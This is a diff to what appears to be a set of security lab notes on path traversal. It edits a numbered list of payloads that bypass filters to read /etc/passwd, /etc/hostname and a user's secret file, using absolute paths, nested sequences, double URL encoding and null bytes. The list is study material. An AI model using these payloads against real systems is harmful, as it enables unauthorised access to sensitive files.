@@ -4371,7 +4371,7 @@ Inject exploit in to read or delete user sensitive data. After injection, trigge
 
 1. Application blocks traversal sequences but treats the supplied filename as being relative to a absolute path and can be exploit with ```/etc/passwd```absolute path to target file payload.  
 2. Images on target is loaded using ```filename``` parameter, and is defending against traversal attacks by stripping path traversal. Exploit using ```....//....//....//....//etc/passwd``` payloads.  
-3. Superfluous URL-encoded ```..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/home/carlos/%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34``` (double-URL encode the word secret) payload can bypass application security controls.  
+3. Superfluous URL-encoded ```?imagefile=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/home/carlos/%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34``` (double-URL encode the word secret) payload can bypass application security controls.  
 5. Leading the beginning of the filename referenced with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
 6. Using a **null** byte character at end plus an image extension to fool APP controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
 7. Double URL encode file path traversal, as example this `../../../../../../../../../../etc/hostname` will be URL double encoded as, `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname`.  
